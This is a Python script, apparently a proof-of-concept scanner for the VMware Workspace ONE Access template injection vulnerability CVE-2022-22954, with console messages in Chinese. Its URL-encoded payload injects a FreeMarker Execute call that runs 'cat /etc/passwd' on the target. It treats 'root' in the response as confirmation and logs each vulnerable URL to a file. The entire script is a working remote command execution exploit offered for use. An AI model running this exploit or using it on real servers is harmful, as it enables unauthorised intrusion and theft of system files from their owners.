import requests
def vmware_one_access_ssti_poc(url):
    poc = r"""/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            print("---------------------------------------\n【！！！！！！】存在CVE-2022-22954漏洞的url:" + url + "\n---------------------------------------\n")
            with open ("存在VMware服务端模板注入漏洞(CVE-2022-22954)的url.txt", 'a') as f:
                f.write(url + "\n")
            f.close()
        else:
            print("【×】不存在CVE-2022-22954漏洞:" + url + "\n")
    except Exception as e:
        pass